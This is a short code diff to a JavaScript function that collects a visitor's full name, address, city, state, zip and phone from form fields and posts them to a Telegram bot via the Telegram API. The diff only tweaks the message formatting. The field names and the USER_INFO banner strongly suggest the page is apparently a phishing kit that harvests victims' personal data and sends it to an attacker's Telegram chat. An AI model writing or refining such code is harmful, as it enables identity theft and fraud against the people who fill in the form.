@@ -13,13 +13,15 @@ function send() {
   const zipp = document.getElementsByName("zipp")[0].value;
   const phonee = document.getElementsByName("phonee")[0].value;
 
-  const message = `Fullname      : ${fullname}
+  const message = `________USER_INFO_________
+Fullname      : ${fullname}
 address1      : ${add1}
-address1      : ${add2}
+address2      : ${add2}
 city          : ${city}
 state         : ${state}
 zipp          : ${zipp}
-phonee        : ${phonee}`;
+phonee        : ${phonee}
+_______________________`;
 
   const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
     message
